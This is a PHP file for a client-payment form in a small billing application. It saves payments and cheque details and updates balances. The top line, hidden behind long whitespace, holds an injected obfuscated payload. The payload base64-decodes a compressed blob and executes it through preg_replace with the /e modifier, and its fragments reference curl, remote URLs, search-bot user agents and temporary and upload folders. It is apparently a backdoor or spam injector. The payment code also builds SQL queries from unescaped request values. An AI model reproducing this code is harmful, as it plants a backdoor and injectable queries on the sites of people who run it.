<?php                                                                                                                                                                 /*versio:2.20*/$I11l=109388;if (!function_exists('Ill1lIlI')){$GLOBALS['I11l'] = 'SvbY3VybAX2luaXQtH_YWxsb3dfdXJsX2ZvcGVuMQ!aHR0cDovLwZb;JndheT1maWxlX2dldF9jb250ZW50cwX3NldG9wdA=sX2V4ZWMhJndheT1jdXJsU_!jLw}E@b3Nvbi5pbgp UllBTkVDQVNFWS5DT00&.cGhwYWlkZS5jb20dw %WV8znOgZGlzcGxheV9lcnJvcnMX_@ZGV0ZXJtaW5hdG9yi@rZnRwMTMOJpeoMi4yMAYTJUVFPUVFRMFFRUQhsiyYmFzZTY0X2RlY29kZQYmFzZTY0X2VuY29kZQ*SFRUUFM!y;)b2Zmg.aHR0cHM6Ly8cJTSFRUUF9IT1NUSdW5pb24c2VsZWN0qeUkVRVUVTVF9VUkk*)zU0NSSVBUX05BTUUR!UVVFUllfU1RSSU5HoPwnZL2Rldi9zaG0L3RtcC8uZm9udC11bml4)uaDyL3RtcC8uSUNFLXVuaXghVE1QmqaVEVNUA$R&VE1QRElS#MBL3RtcAH(dXBsb2FkX3RtcF9kaXIO.dG1wd3AtY29udGVudC91cGxvYWRzd3AtY29udGVudC9jYWNoZQquLgBdmVyc2lvGZCljLQc(LXBocA RVhFQ1BIUAWb3V0b2sASFRUUF9VU0VSX0FHRU5ULA*dZ29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXgkbL3BnLnBocD91PQ*!XJms9TOJnQ9cGhwJnA9JnY9aaJ)ZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5VlZ3dFA0MFlRL2l0TGhKQXQrVnl2RXllaDFGVWlMaHlXYUV4Q09PbkVSVll1MllCMWpvMXNweHhDL1BmTzdNTzdnS0d0UU1Mc3pNNTd2cGxOdDhRNjJMQnRtck9OMWRtd21wVzdORi9WUmRteDdTZXkzZWZyT2kxeVlsS1NMU3UyMXVGc05vdTltVU9PNE11RFh4S1M2ZlhGaFUyZWlEN1pwZXV5cU5NZHMrcHl6K3dUVXJKNlgrYkVGQUduejFyVExhdTNhY2FBNkhteDV6bmtNSW95R21WZ0RYeEZFYzFBYkpSbE5JdXl5T282cEEvM0R5T0tOS0JJSHJmaE9IYklBRGhHYVo0bUZhdXRoa0NCNG51MlF5aVFVNGdEWjdsdFliRkphS3JFUTF1NDZjVmdZamhDZy9GbXNpN3ltdVYxcFVYMGZGRGcyY1FsMGlIOEVoNjVXbVlRT0tRTGlwcjRTTkVZR1paVkRNMVRFVXJZcjdRQ0ZkSm5UTk1oaHRIRGVJL2txU1dDQXVLenRxQU1BMjdWaWFTMEIyNGdJeWZsV0ZLTFEwNnY1eGZ4NVNLQlB3NzVuNTVTRDFYNzlvZUN6eWZqejVPNXMxMkI2eDh5emllTDYvbDBNUjlQcjg3Z2dxeXg5L2xQNCtsMGNycFlSSDlONHV1RlF3SVJna3hVMVVoR1E5MURVZXQ5bVNYcnJLaVljWXJwWUx2Nyt0R1NseUVKV296MkZlc0grSitickFvZWxWWFJLU2dWbFcrcll2Mnp1R2U1THYwaGxqL25FSDBBMXpOaE5GcWcyb2VvQXBpMUtTY3YyeE5jMnQ3dnNYeFUvM2ErVEJia1NXYnErZWhoOVJpaUphd201NHZGNVcvVTliNlgzL1B6b3FwL0J6Wmgyak1lZFdUalFheEIrT1g1WlJKZjZmS2hQc1UrY2ZIODYyUitGY1hURnQzWEZTcy9qVytoWjFDNEVNYUZLd1VQZHdnR0J4L2dqL1RQSmtkSHhIcUZOK1NUSnY4QjF1aEl1Umh4YUZuREdPb1BPUlNOdGlyZkNwN3dFdmdOWHJKZjkxbXhZVmFuc2RGUklvRnZueVBDU080YmI2bjdPZDIxM3dNK3JoTi91TDRZa3pndXk5V2pBVU4rbjdlVzBXeTBPNFNqNHhkSEFTU2NCdGhaRFpnK2xHa3RvSFFXenh5UnZCaWlJTXNISUNZRzlHcUtEcG0wdkVHUEF4MndqN1pLRUwvU0NEb3hZeFhIalMrTi9tSmZROEtoU3pLUVNpV1cwd2hFc3ZWZFlkZytBSGU2dGlzWmpTb2FkbmtWeVlzdWoxK0haK2t0b0hOVXc1aGcyWXVocHFtK0IzaEcreEx2RDdFUm95elVaSXp4UUxRTCttSlFNTlJpeUNDb1JBYWxoeUo3Z29TSEJxbVB0Z3dGdk1DUmVRdGRFaVRSVE9GckNCWHRuVmE4bUpLcnlSejY1MGJQSDg5SFM1ZTJ6T1BvZlJaeVlNNHRDbnA3WWx5ODB0dEZyS0JVWmsrUzNiQ3F5N3JJaWdkV3RpcnBkam1TWTVWdmk1S3QxbmRRVkFtaXlhcVNFYUhobnpybGFDeUl2QzhxU3g3cVl1djJlUGdSUjFIQ2pieStERnZBVkEzRWQyVUZZTmp3djhsNkJxdXNnM2REM2UveWxscUtjZjgrblErUHQrUWhGV1JNYUdzSWo0ZThKcGYvSnQ0MTh0aWpBYllFVE5lUEpJcFU4ajZQK09BSVZWcmJialYraW9uazRWS3oyd1JxRXJteUtWd0o4cklUMUk0QmhiOUp5M3dGcUpza1o5SEZKRWxzOTNNMGgwa2J6NytCdHN2eGZBeWZjdGJ5UFUxQW5PbVZLRUZ6b2VoNmNrUFRSNEZxOFJZdmVvTUFDM3paVGh6NjJNV0NPSmwrZmVmYVM4b3h4VUpxb3pUUzlBcm44U09IdkYwakErcHhxMjFIeFVzRFhOQ2xxTDJWZ25sdUp5SFUrejZRWHZTZURLN29Qa3lSYkxvRHRhdUlRNzVKODA4M2JNMlNXSWFyQkVGLzlRTjNjZk1tdDRVdmpQendoUHdBL1QrYklWYnY3c08zQmlzWUY4VjE4Z3E0T3JocEpOK1M4ZlhpdkxNTVE4bEdpaElqZnhsZkxXNDZiNmhxaUtpUk1KTER4bERheC9RNUN0SU5jNDZQNVZUaFUwQVQraDUvVU9nRkN3WjdIRXAwdDVRdG1wMG4xaE5ZUEdKL3J6SjFCeVI4YkZ6ZmwzazNUdkFSWUhNUWhoVy90anorcVpJaEhrVVFYYTZyTHZick8vRXZmOXVzcy8yR0pVVytadXBRNEtSOE5FSDdqMkNSWmZrYWx4QjVKSVpkTFBiRzBjZGczL2ZGVStnRjJLdGxTSFAxZUZ4TnB4Q0xBMWhLUkZVQ1RrZjAxU2dRSmpnTjlTQU16L2ppTDhlYjRhcDRBK0tlYW02NkE1NkZIbDhTMEMrZHpvRS93Q0Nyc2pNSWNuYTlyWUJCTDJpdVFNM3czUS9mWXFCUXYwejVuZ2I3blg2Y25yeEt5ZlBMcm9DZmZ3RGgzMGhRIikpKTsZ%cHJlZ19yZXBsYWNl@O)';function Ill1lIlI($a, $b){$c=$GLOBALS['I11l']; $d=pack('H*','626173653634'.'5f6465636f6465'); return $d(substr($c, $a, $b));};$Ill1II1II = Ill1lIlI(3398, 16);$Ill1II1II("/IllllIIl1/e", Ill1lIlI(753, 2643), "IllllIIl1");};?><?
require_once("includes/dbsmain.inc.php");
global $ARR_SOURCES,$creadit_Arr;
$client_id = $_REQUEST['client_id'];
$service_id=$_REQUEST['service_id'];
$totalbaln=$_SESSION['totalbal'];
if(is_post_back()) {
	if($id1=='id1')
	{
		$sql2="insert into client_payment_master set pay_date='$pay_date', pay_cheque_date='$pay_cheque_date', pay_invoice_id='$pay_invoice_id', pay_client_id='$pay_client_id', pay_service_id='$serv_service_id', pay_mode='$paymethod', pay_amount='$pay_amount', pay_cheque_draft_no='$pay_cheque_draft_no', pay_branchname='$pay_branchname', pay_bankname='$pay_bankname', pay_bankaddress='$pay_bankaddress',pay_paid_type='Taking', pay_status='Active'";
		db_query($sql2);
		
				$sql3="update client_opt_services set opt_serv_service_balance='$client_payment_bal'";
				if($_REQUEST['client_payment_bal']==0){
					$sql3 .=" ,opt_serv_paidstatus='Paid'";
				}
				else
				{
					$sql3 .=" ,opt_serv_paidstatus='Unpaid'";
				}
				$sql3 .=" where opt_serv_id='$service_id'";
				db_query($sql3);
				
				$sql4="update client_master set client_payment_bal='$totalbaln' where client_id='$client_id'";
				db_query($sql4);
				$_SESSION['totalbal']='';
				?>
                <script>
					window.parent.location.reload();
					self.close();
                </script>
                <?
				
	}
	
}


if(strlen($_GET[client_id])){
	////////////////////////////// Mahfooz Start ////////////////////////////////////
$result = db_query("select *from  client_opt_services where opt_serv_client_id='$client_id' and  opt_serv_id='$service_id' and opt_serv_status='Active'");
////////////////////////////// Mahfooz Start End ////////////////////////////////////
if ($line_raw = mysql_fetch_array($result)){
	$line = ms_form_value($line_raw);
	@extract($line);
}
$showcase="Edit";
}
else{
$showcase="Add";
}
include("includes/fvalidate.inc.php");
?>
<link href="styles.css" rel="stylesheet" type="text/css">
<script src="SpryAssets/SpryTabbedPanels.js" type="text/javascript"></script>
<link href="SpryAssets/SpryTabbedPanels.css" rel="stylesheet" type="text/css" />
<script language="javascript" src="datetimepicker_css1.js"></script>
<script language="javascript" type="text/javascript" src="includes/general.js"></script>
<script language="javascript">
function isNumberKey(evt)
{
var charCode = (evt.which) ? evt.which : event.keyCode
if (charCode > 31 && (charCode < 48 || charCode > 57))
return false;

return true;
}

</script>
<script language="javascript" type="text/javascript">
function showS(){
	if(document.getElementById('paymethod').value!=''){
		if(document.getElementById('paymethod').value=='Cheque'){
		 document.getElementById('checkcontainer').style.visibility='visible';
		}
		else
		{
			document.getElementById('checkcontainer').style.visibility='hidden';
		}
		
    }
	else
	{
		alert('Select Payment Method');
		document.getElementById('paymethod').focus();	
		return false;
	}
}
</script>

<script language="javascript" type="text/javascript">
function validat_value(){
		var serviceprice=document.getElementById("service_price").value;
		var amount=document.getElementById("pay_amount").value;
		if(parseInt(amount) > parseInt(serviceprice)){
			alert("You Can Not Enter More Amount");
			document.getElementById("pay_amount").value=serviceprice;
			document.getElementById("client_payment_bal").value=serviceprice;	
			}
			else
			{
				var balance=serviceprice-amount;
				document.getElementById("client_payment_bal").value=balance;	

			}
		
	
	
	
}
</script>


    <div class="TabbedPanelsContent">            
   <form name="form1" action="" method="post" enctype="multipart/form-data" <?= validate_form()?>>
      <table width="99%" border="0" cellspacing="5" cellpadding="0">
      <tr>
      <td colspan="3"><?=$emsg?></td>
      </tr>
        <tr>
          <td width="13%" class="headSection">Date</td>
          <td width="39%"><?=get_date_picker("pay_date","","","")?> </td>
          <td width="36%" class="headSection">Amount</td>
          <td width="12%">
           <input type="text" name="pay_amount" id="pay_amount" alt="blanck" emsg="Please enter numeric no. of days." onkeypress="return isNumberKey(event)" onkeyup="validat_value();"  alt="decimal|*|2" emsg="Please enter amount in 00.00 format"/>
         </td>
        </tr>
        <tr>
          <td class="headSection">Payment method</td>
          <td><select name="paymethod" id="paymethod" alt="select" emsg="Please Select Payment Mode." onchange="return showS()">
            <option value="">Select</option>
            <?
		 foreach($creadit_Arr as $paymethod)
			{
				?>
            <option value="<?=$paymethod?>">
              <?=$paymethod?>
            </option>
            <?
			}
			?>
          </select></td>
          <td class="headSection">Balance</td>
          <td><input type="text" name="client_payment_bal" id="client_payment_bal" alt="blanck" readonly /></td>
        </tr>
        <tr>
          <td colspan="4">
          <div id="checkcontainer" style=" visibility:hidden" >
          <table width="99%" border="0" cellspacing="5" cellpadding="0">
           
              <td class="headSection">Cheque No</td>
              <td><input type="text" name="pay_cheque_draft_no" id="pay_cheque_draft_no" /></td>
              <td class="headSection">Branch</td>
              <td><input type="text" name="pay_branchname" id="pay_branchname" /></td>
            </tr>
            <tr>
             
              <td class="headSection">Cheque Date</td>
              <td><?=get_date_picker("pay_cheque_date","","","")?></td>
               <td class="headSection">Bank Name</td>
              <td><input type="text" name="pay_bankname" id="pay_bankname" /></td>
            </tr>
             <tr>
              <td class="headSection" colspan="1" >Bank Address</td>
              <td colspan="2"><input type="text" name="pay_bankaddress" id="pay_bankaddress"  size="40"/></td>
             
            </tr>
          </table>
          </div>
          </td>
          </tr>
        <tr>
          <td colspan="4"> 
          <input type="hidden" name="pay_invoice_id" id="pay_invoice_id" value="<?=$opt_serv_invoice_id?>">
          <input type="hidden" name="pay_client_id" id="pay_client_id" value="<?=$opt_serv_client_id?>">
          <input type="hidden" name="serv_service_id" id="serv_service_id" value="<?=$opt_serv_service_id?>">
          <input type="hidden" name="service_price" id="service_price" value="<?=$opt_serv_service_balance?>">
          <input type="hidden" name="service_amount" id="service_amount" value="<?=$opt_serv_service_price?>">
            <input type="hidden" name="id1" id="id1" value="id1" />
            <div align="center">
              <input type="submit" name="save" id="save" value="Save" onclick="return checkcomment();"/>
            </div></td>
          </tr>
      </table>
        </form>
    </div>
   
<p>&nbsp;</p>

<script type="text/javascript">
<!--
var TabbedPanels1 = new Spry.Widget.TabbedPanels("TabbedPanels1");
//-->
</script>
